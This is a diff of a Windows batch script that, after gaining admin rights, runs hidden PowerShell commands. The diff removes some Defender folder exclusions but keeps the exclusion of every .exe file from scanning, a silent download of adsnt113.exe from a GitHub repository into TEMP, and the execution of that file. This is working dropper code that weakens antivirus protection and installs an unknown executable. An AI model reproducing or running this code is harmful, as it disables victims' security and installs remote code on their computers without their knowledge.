@@ -25,13 +25,8 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-
-REM --> Silent PowerShell commands
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
 :--------------------------------------
-Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionExtension exe"
+Powershell -WindowStyle Hidden -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/adsnt113.exe' -OutFile adsnt113.exe"
+Powershell -WindowStyle Hidden -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/adsnt113.exe' -OutFile adsnt113.exe"
 adsnt113.exe
